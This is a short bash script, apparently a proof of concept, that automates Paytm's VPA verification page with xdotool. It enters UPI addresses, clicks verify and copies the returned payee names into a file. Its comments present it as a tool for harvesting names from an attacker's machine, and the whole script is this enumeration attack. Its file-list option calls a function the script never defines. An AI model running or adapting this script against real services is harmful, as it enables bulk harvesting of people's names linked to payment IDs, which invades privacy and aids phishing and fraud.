#!/bin/bash 

## TO automate and extract payee's name based of output of adding of vpa names using all using xdotool 
## This is a demonstration and a working POC for Paytm's VPA submission 
## Do note browser window size must be 100% zoom inorder for this to harvest flawlessly from an attackers endpoint.

usage(){
	cat << EOF
	usage ./paytm-tpsl [-h|-v|-f]
		-v : Enter VPA to valid through input
		-h : help section of the tool
		-f : List of VPAs to validate from a file provided
EOF
}

validateVPA(){
	vpa="$1"
	xdotool keydown Alt key Tab keyup Alt
	xdotool mousemove 843 607 # input field
	sleep 0.5
	xdotool click 1
	command xdotool key ctrl+a BackSpace
	sleep 0.5
	command xdotool type $vpa
	xdotool mousemove 908 683 # verify button
	xdotool click 1
	sleep 3	
	xdotool mousemove 924 641
	xdotool click 1
	xdotool click 1
	xdotool click 1
	xclip -selection clipboard -o >> VPAnames && echo >> VPAnames
}

while getopts ":hv:f:" OPTS ; do
	case "$OPTS" in 
		h)
			usage
			;;
		v)
			vpa="${OPTARG}"
			validateVPA $vpa
			;;
		f)
			file="${OPTARG}"
			if [[ -f $file ]]; then
				validateVPAlist $file
			fi
			;;
		\?)
			echo "Invalid command. Exiting.."
			usage
			exit 1
			;;
		:)
			echo "Requires an argument.Exiting.."
			usage
			exit 1
			;;
	esac
done

if [[ ! -n "$1" ]]; then
	usage
	exit 1
fi

shift $((OPTIND-1))

if [[ $# -ge 1 ]]; then
	echo "Too many arguments provided. Exiting"
	exit 1
fi

